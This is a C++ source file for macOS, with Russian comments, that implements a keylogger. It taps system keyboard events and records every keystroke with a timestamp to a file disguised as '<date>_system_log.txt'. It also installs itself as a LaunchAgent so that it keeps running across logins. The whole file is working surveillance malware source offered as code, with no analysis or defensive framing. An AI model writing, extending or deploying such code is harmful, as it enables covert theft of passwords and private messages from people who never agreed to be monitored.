#include <iostream>
#include <string>
#include <iostream>

#include <unistd.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

#include "file_reader.h"
#include "time_formatter.h"


wchar_t keyCodeToChar(int keyCode) {
    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout = reinterpret_cast<const UCKeyboardLayout *>(CFDataGetBytePtr(layoutData));

    UInt32 deadKeyState = 0;
    UniCharCount maxStringLength = 255;
    UniCharCount actualStringLength = 0;
    UniChar unicodeString[maxStringLength];

    OSStatus status = UCKeyTranslate(
        keyboardLayout,
        keyCode,
        kUCKeyActionDown,
        0,
        LMGetKbdType(),
        kUCKeyTranslateNoDeadKeysBit,
        &deadKeyState,
        maxStringLength,
        &actualStringLength,
        unicodeString
    );

    if (status != noErr) {
        std::cerr << "Ошибка при преобразовании кода клавиши в символ." << std::endl;
        return L'\0';
    }

    wchar_t result = unicodeString[0];

    CFRelease(currentKeyboard);

    return result;
}


// Функция-обработчик событий
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    // Проверяем, что это событие нажатия клавиши
    if (type == kCGEventKeyDown) {
        // Получаем код нажатой клавиши
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        // Преобразуем код клавиши в символ
        wchar_t keyChar = keyCodeToChar(keyCode);

        ////////////////////////////////
        /// Рабочее решение с локалью и выводом в консоль
        // std::locale utf8_locale("ru_RU.UTF-8");
        // std::wcout.imbue(utf8_locale);
        // std::wcout << L"keyChar___" << keyChar << std::endl;
        //////////////////////////////

        std::string date_format = "%d-%m-%Y";
        std::string time_format = "%H:%M:%S";
        std::string date_time = getTimeStamp(date_format.c_str());
        std::string time_stamp = getTimeStamp(time_format.c_str());
        // std::wstring new_string_time = std::wstring(time_stamp.begin(), time_stamp.end());
        // std::wstring new_date_time = std::wstring(date_time.begin(), date_time.end());

        std::string file_name = date_time + "_system_log.txt";
        std::wstring key_string = L"=KEY=" + std::wstring(1, keyChar);
        std::string info_string = "=DATE=" + date_time + "=TIME=" + time_stamp;
        WriteToOutputFile(key_string, info_string, file_name);
    }

    return event;
}

int main(int argc, char *argv[]) {
    if (argc < 1) {
        std::cerr << "Не удалось получить путь к программе." << std::endl;
        return 1;
    }

    char resolved_path[PATH_MAX];
    if (realpath(argv[0], resolved_path) == nullptr) {
        std::cerr << "Не удалось разрешить путь к программе." << std::endl;
        return 1;
    }

    // Извлечение пути к директории
    char *last_slash = strrchr(resolved_path, '/');
    if (last_slash != nullptr) {
        // Обрезаем имя программы, оставляя только путь к директории
        *last_slash = '\0'; 
    }

    CreateLaunchAgentFile(resolved_path);

    // Создаем Tap событий клавиатуры
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, 
        kCGHeadInsertEventTap, 
        kCGEventTapOptionDefault, 
        CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyUp), 
        eventCallback,
        nullptr
    );

    if (!eventTap) {
        const char* errorMessage = "Не удалось создать Tap событий.";
        std::cerr << errorMessage << std::endl;
        return 1;
    }

    // Получаем run loop
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

    // Начинаем слушать события
    CGEventTapEnable(eventTap, true);

    // Запускаем run loop
    CFRunLoopRun();

    return 0;
}
